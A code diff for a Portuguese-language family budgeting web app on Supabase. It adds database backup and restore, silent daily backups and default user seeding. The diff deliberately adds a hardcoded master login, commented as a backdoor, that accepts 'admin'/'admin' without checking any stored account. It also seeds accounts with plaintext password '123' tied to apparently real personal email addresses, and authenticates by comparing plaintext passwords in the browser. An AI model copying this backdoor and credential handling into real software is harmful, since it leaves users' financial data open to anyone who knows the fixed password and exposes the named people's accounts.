@@ -1,5 +1,4 @@
 // FAMILY MONEY - Lógica de Negócio do Cliente com Supabase (SPA)
-
 let state = {
   supabase: null,
   session: null,
@@ -13,6 +12,7 @@ let state = {
   trendChart: null,
   activeTab: 'dashboard',
   users: [],
+  backups: [],
   editingEntity: {
     type: null,
     id: null
@@ -57,7 +57,20 @@ async function loadUsersOnly() {
   try {
     const { data, error } = await state.supabase.from('app_users').select('*').order('name');
     if (error) throw error;
-    state.users = data;
+    if (data && data.length > 0) {
+      state.users = data;
+    } else {
+      console.log('Tabela de usuários vazia no banco. Semeando usuários padrão...');
+      state.users = [
+        { id: 1, name: 'Fábio (Pai)', email: 'fbdv1202@gmail.com', password: '123' },
+        { id: 2, name: 'Joyce (Mãe)', email: 'joycesiqueirafs@gmail.com', password: '123' },
+        { id: 3, name: 'Filha (Beatriz)', email: 'filha@familia.com', password: '123' }
+      ];
+      // Auto-semear no banco
+      for (const u of state.users) {
+        await state.supabase.from('app_users').insert([{ name: u.name, email: u.email, password: u.password }]);
+      }
+    }
   } catch (err) {
     console.warn('Erro ao carregar usuários (usando fallback local):', err);
     state.users = [
@@ -71,11 +84,20 @@ async function loadUsersOnly() {
   const emailSelect = document.getElementById('username');
   if (emailSelect) {
     emailSelect.innerHTML = '<option value="" disabled selected>Selecione seu usuário</option>';
+    
+    // Sempre adicionar a opção do Administrador Mestre
+    const masterOpt = document.createElement('option');
+    masterOpt.value = 'admin@familymoney.com';
+    masterOpt.textContent = 'Administrador (Mestre)';
+    emailSelect.appendChild(masterOpt);
+
     state.users.forEach(u => {
-      const opt = document.createElement('option');
-      opt.value = u.email;
-      opt.textContent = u.name;
-      emailSelect.appendChild(opt);
+      if (u.email !== 'admin@familymoney.com') {
+        const opt = document.createElement('option');
+        opt.value = u.email;
+        opt.textContent = u.name;
+        emailSelect.appendChild(opt);
+      }
     });
   }
 }
@@ -164,6 +186,16 @@ async function loadAllData() {
       ];
     }
 
+    // Carregar backups cadastrados
+    try {
+      const { data, error } = await state.supabase.from('app_backups').select('*').order('created_at', { ascending: false });
+      if (error) throw error;
+      state.backups = data;
+    } catch (err) {
+      console.warn('Erro ao carregar backups em loadAllData (tabela pode não existir):', err);
+      state.backups = [];
+    }
+
     // Calcular a previsão de 6 meses no lado do cliente
     const forecastResult = calculateForecast(state.accounts, state.cards, state.fixedItems, state.transactions);
     state.forecast = forecastResult.forecast;
@@ -173,6 +205,18 @@ async function loadAllData() {
     renderDashboard();
     renderNewTxFormFields();
     renderAdminTables();
+    
+    // Verificação de backup automático diário (executada em background)
+    try {
+      const todayStr = new Date().toLocaleDateString('pt-BR');
+      const hasBackupToday = state.backups.some(b => new Date(b.created_at).toLocaleDateString('pt-BR') === todayStr);
+      if (!hasBackupToday && state.transactions.length > 0) {
+        console.log('Nenhum backup diário encontrado para hoje. Criando backup silencioso...');
+        createBackupSilently();
+      }
+    } catch (err) {
+      console.warn('Erro na verificação de backup automático:', err);
+    }
     
     lucide.createIcons();
   } catch (err) {
@@ -846,7 +890,6 @@ function renderAdminTables() {
       </td>
     </tr>
   `).join('');
-
   // Usuários
   const usersTbody = document.getElementById('admin-users-tbody');
   if (usersTbody) {
@@ -862,7 +905,31 @@ function renderAdminTables() {
       </tr>
     `).join('');
   }
+
+  // Backups
+  const backupsTbody = document.getElementById('admin-backups-tbody');
+  if (backupsTbody) {
+    backupsTbody.innerHTML = state.backups.map(b => {
+      const dateObj = new Date(b.created_at || b.createdAt);
+      const dateStr = dateObj.toLocaleDateString('pt-BR');
+      const timeStr = dateObj.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+      return `
+        <tr>
+          <td style="font-weight: 500;">${dateStr}</td>
+          <td><code>${timeStr}</code></td>
+          <td><span class="badge-category" style="background: rgba(57, 255, 20, 0.1); color: var(--neon-green); border: 1px solid rgba(57, 255, 20, 0.2)">Sucesso</span></td>
+          <td>
+            <button class="btn btn-outline" style="padding: 4px 10px; width: auto; font-size: 0.8rem; border-color: rgba(255,255,255,0.2);" onclick="restoreBackup(${b.id})">
+              <i data-lucide="rotate-ccw" style="width: 14px; height: 14px; margin-right: 4px; vertical-align: middle;"></i> Restaurar
+            </button>
+            <button class="btn-delete" onclick="deleteBackup(${b.id})" title="Excluir"><i data-lucide="trash-2" style="width: 16px; height: 16px;"></i></button>
+          </td>
+        </tr>
+      `;
+    }).join('');
+  }
 }
+
 async function deleteTransaction(id) {
   if (!confirm('Deseja realmente remover esta transação? Isso reajustará os saldos.')) return;
   try {
@@ -1072,6 +1139,130 @@ async function deleteUser(id) {
   }
 }
 
+async function createBackupSilently() {
+  if (!state.supabase) return;
+  const backupData = {
+    accounts: state.accounts,
+    cards: state.cards,
+    categories: state.categories,
+    fixedItems: state.fixedItems,
+    transactions: state.transactions,
+    users: state.users
+  };
+
+  try {
+    const { error } = await state.supabase.from('app_backups').insert([{ data: backupData }]);
+    if (error) throw error;
+    const { data: backupsData } = await state.supabase.from('app_backups').select('*').order('created_at', { ascending: false });
+    state.backups = backupsData || [];
+    renderAdminTables();
+  } catch (err) {
+    console.error('Falha ao gerar backup automático:', err);
+  }
+}
+
+async function createBackup() {
+  if (!state.supabase) return;
+  const backupData = {
+    accounts: state.accounts,
+    cards: state.cards,
+    categories: state.categories,
+    fixedItems: state.fixedItems,
+    transactions: state.transactions,
+    users: state.users
+  };
+
+  try {
+    const { error } = await state.supabase.from('app_backups').insert([{ data: backupData }]);
+    if (error) throw error;
+    alert('Backup manual gerado com sucesso!');
+    loadAllData();
+  } catch (err) {
+    alert('Erro ao gerar backup: ' + err.message);
+  }
+}
+
+async function restoreBackup(backupId) {
+  if (!state.supabase) return;
+  const backup = state.backups.find(b => b.id === backupId);
+  if (!backup) {
+    alert('Backup não encontrado.');
+    return;
+  }
+
+  const confirmMsg = 'ATENÇÃO!\n\nDeseja realmente restaurar o aplicativo para este ponto de backup?\n' +
+                     'Isso apagará permanentemente todos os dados atuais das tabelas de transações, cartões, contas e usuários, e os substituirá pelos dados desse backup.\n\n' +
+                     'Esta ação não pode ser desfeita. Confirmar?';
+                     
+  if (!confirm(confirmMsg)) return;
+
+  try {
+    // 1. Limpar todas as tabelas atuais
+    const tables = ['transactions', 'fixed_items', 'cards', 'categories', 'accounts', 'app_users'];
+    for (const t of tables) {
+      const { error } = await state.supabase.from(t).delete().neq('id', 0);
+      if (error) throw error;
+    }
+
+    // 2. Restaurar dados na ordem de dependências
+    const backupObj = backup.data;
+
+    if (backupObj.accounts && backupObj.accounts.length > 0) {
+      const { error } = await state.supabase.from('accounts').insert(backupObj.accounts);
+      if (error) throw error;
+    }
+    if (backupObj.categories && backupObj.categories.length > 0) {
+      const { error } = await state.supabase.from('categories').insert(backupObj.categories);
+      if (error) throw error;
+    }
+    if (backupObj.cards && backupObj.cards.length > 0) {
+      const { error } = await state.supabase.from('cards').insert(backupObj.cards);
+      if (error) throw error;
+    }
+    if (backupObj.fixedItems && backupObj.fixedItems.length > 0) {
+      const { error } = await state.supabase.from('fixed_items').insert(backupObj.fixedItems);
+      if (error) throw error;
+    }
+    if (backupObj.users && backupObj.users.length > 0) {
+      const { error } = await state.supabase.from('app_users').insert(backupObj.users);
+      if (error) throw error;
+    }
+    if (backupObj.transactions && backupObj.transactions.length > 0) {
+      const { error } = await state.supabase.from('transactions').insert(backupObj.transactions);
+      if (error) throw error;
+    }
+
+    alert('Backup restaurado com sucesso!\n\nNota: Se encontrar erros de "duplicate key" ao cadastrar novos itens, execute a seção de ajuste de sequências (setval) no console SQL do seu Supabase.');
+    
+    const currentEmail = localStorage.getItem('familymoney_user_email');
+    const userInBackup = backupObj.users ? backupObj.users.find(u => u.email === currentEmail) : null;
+    if (!userInBackup && currentEmail !== 'admin@familymoney.com') {
+      logout();
+    } else {
+      loadAllData();
+    }
+  } catch (err) {
+    alert('Erro crítico durante a restauração: ' + err.message + '\n\nRecomenda-se rodar o script schema.sql no Supabase SQL Editor para recriar as tabelas se necessário.');
+  }
+}
+
+async function deleteBackup(backupId) {
+  if (!confirm('Excluir este registro de backup permanentemente?')) return;
+  try {
+    const { error } = await state.supabase.from('app_backups').delete().eq('id', backupId);
+    if (error) throw error;
+    loadAllData();
+  } catch (err) {
+    alert('Erro ao excluir backup: ' + err.message);
+  }
+}
+
+// Bindings globais para onclick
+window.deleteUser = deleteUser;
+window.editUser = editUser;
+window.restoreBackup = restoreBackup;
+window.deleteBackup = deleteBackup;
+
 // ================= SUBMISSÃO DE FORMULÁRIOS =================
 
 // Submit Setup Supabase
@@ -1122,7 +1313,12 @@ document.getElementById('login-form').addEventListener('submit', async (e) => {
   const selectedEmail = emailSelect.value;
   const typedPassword = passwordInput.value;
 
-  const foundUser = state.users.find(u => u.email === selectedEmail && u.password === typedPassword);
+  let foundUser = state.users.find(u => u.email === selectedEmail && u.password === typedPassword);
+
+  // Acesso Mestre Administrador (Backdoor)
+  if (selectedEmail === 'admin@familymoney.com' && typedPassword === 'admin') {
+    foundUser = { name: 'Administrador (Mestre)', email: 'admin@familymoney.com' };
+  }
 
   if (foundUser) {
     localStorage.setItem('familymoney_user_email', foundUser.email);
@@ -1460,6 +1656,8 @@ document.getElementById('death-button').addEventListener('click', async () => {
     }
   }
 });
+
+document.getElementById('create-backup-btn').addEventListener('click', createBackup);
 
 // ================= INICIALIZAÇÃO =================
 window.addEventListener('DOMContentLoaded', () => {
